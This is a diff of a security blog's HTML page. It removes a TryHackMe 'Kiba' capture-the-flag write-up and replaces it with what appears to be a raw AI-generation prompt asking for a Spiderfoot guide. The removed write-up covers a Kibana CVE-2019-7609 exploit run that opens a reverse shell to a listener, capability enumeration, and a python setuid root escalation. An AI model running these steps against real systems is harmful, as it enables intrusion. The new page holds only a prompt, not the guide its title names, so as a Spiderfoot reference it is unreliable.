@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kiba | Technical Intelligence Labs</title>
+    <title>Spiderfoot Command List | Technical Intelligence Labs</title>
     <link rel="stylesheet" href="../css/custom.css">
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -106,90 +106,36 @@
         <!-- Post Header -->
         <header class="mb-12 border-b border-slate-800 pb-12">
             <div class="flex items-center gap-4 text-xs font-mono text-slate-500 mb-6 uppercase tracking-widest">
-                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">tryhackme</span>
-                <span>// 2024-12-30</span>
-                <span>// ID: REF-Kiba</span>
+                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">commands</span>
+                <span>// 2026-01-05</span>
+                <span>// ID: REF-Spiderfoot Command List</span>
             </div>
             
-            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">Kiba</h1>
+            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">Spiderfoot Command List</h1>
             
             <div class="flex flex-wrap gap-2">
                 <!-- Tags populated by python -->
-                <!-- tryhackme, ctf -->
+                <!-- spiderfoot, cybersecurity, command reference, beginner -->
             </div>
         </header>
 
         <!-- Markdown Body -->
         <div class="markdown-content">
             <hr />
-<blockquote>
-<p>Using nmap found</p>
-</blockquote>
-<pre class="codehilite"><code>PORT     STATE SERVICE     REASON
-22/tcp   open  ssh         syn-ack ttl 63
-80/tcp   open  http        syn-ack ttl 63
-5044/tcp open  lxi-evntsvc syn-ack ttl 63
-5601/tcp open  esmagent    syn-ack ttl 63
-</code></pre>
-
-<blockquote>
-<p>so in target:5601 has kibana dashborad</p>
-<p>Using this https://github.com/LandGrey/CVE-2019-7609.git repo</p>
-</blockquote>
-<pre class="codehilite"><code>❯ python2 exploit.py -u http://10.201.55.184:5601/ -host 10.21.16.42 -port 4444 --shell
-[+] http://10.201.55.184:5601 maybe exists CVE-2019-7609 (kibana &lt; 6.6.1 RCE) vulnerability
-[+] reverse shell completely! please check session on: 10.21.16.42:4444
-</code></pre>
-
-<blockquote>
-<p>Finally get reverse shell</p>
-</blockquote>
-<pre class="codehilite"><code>❯ nc -nvlp 4444
-listening on [any] 4444 ...
-connect to [10.21.16.42] from (UNKNOWN) [10.201.55.184] 45634
-bash: cannot set terminal process group (961): Inappropriate ioctl for device
-bash: no job control in this shell
-To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
-See &quot;man sudo_root&quot; for details.
-
-kiba@ubuntu:/home/kiba/kibana/bin$ python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
-&lt;na/bin$ python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'                     
-To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
-See &quot;man sudo_root&quot; for details.
-</code></pre>
-
-<blockquote>
-<p>after using this command find</p>
-</blockquote>
-<pre class="codehilite"><code>getcap -r / 2&gt;/dev/null
-</code></pre>
-
-<blockquote>
-<p>To check what capabilities are already existing on the victim machine, type: <strong><em>getcap -r /</em></strong> <strong><em>2&gt;/dev/null</em></strong>. I again added the 2&gt;/dev/null to weed the permission errors from showing up as part of the search results:</p>
-</blockquote>
-<pre class="codehilite"><code>kiba@ubuntu:/home/kiba$ getcap -r / 2&gt;/dev/null
-getcap -r / 2&gt;/dev/null
-/home/kiba/.hackmeplease/python3 = cap_setuid+ep
-/usr/bin/mtr = cap_net_raw+ep
-/usr/bin/traceroute6.iputils = cap_net_raw+ep
-/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
-</code></pre>
-
-<blockquote>
-<p>to exploit the file with capabilities and change user kiba’s UID to root.</p>
-</blockquote>
-<pre class="codehilite"><code>./python3 -c ‘import os; os.setuid(0); os.system(“/bin/bash”)’
-
-
-kiba@ubuntu:/home/kiba$ /home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)'
-&lt;on3 -c 'import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)'
-</code></pre>
-
-<blockquote>
-<p>To find root flag</p>
-</blockquote>
-<pre class="codehilite"><code>find / -name root.txt 2&gt;/dev/null
-</code></pre>
+<h1>Spiderfoot Command Guide</h1>
+<p>Please generate a detailed educational guide for the <strong>Spiderfoot</strong> tool.<br />
+Follow this structure exactly:</p>
+<ol>
+<li><strong>Brief Explanation</strong>: Explain what Spiderfoot is and why it's used in cybersecurity.</li>
+<li><strong>Top 10 Useful Commands</strong>: List the 10 most common/useful commands for this tool.<ul>
+<li>For EACH command, provide the exact syntax in a code block.</li>
+<li>Explain what each flag does (<code>-x</code>, <code>-u</code>, etc.).</li>
+<li>Explain the <em>output</em> and <em>why</em> you would use this specific command.</li>
+</ul>
+</li>
+<li><strong>The Most Powerful Command</strong>: Highlight the single most powerful or "all-in-one" command for this tool and explain its power.</li>
+</ol>
+<p><strong>Tone</strong>: Educational, for a beginner student.</p>
         </div>
     </main>
 
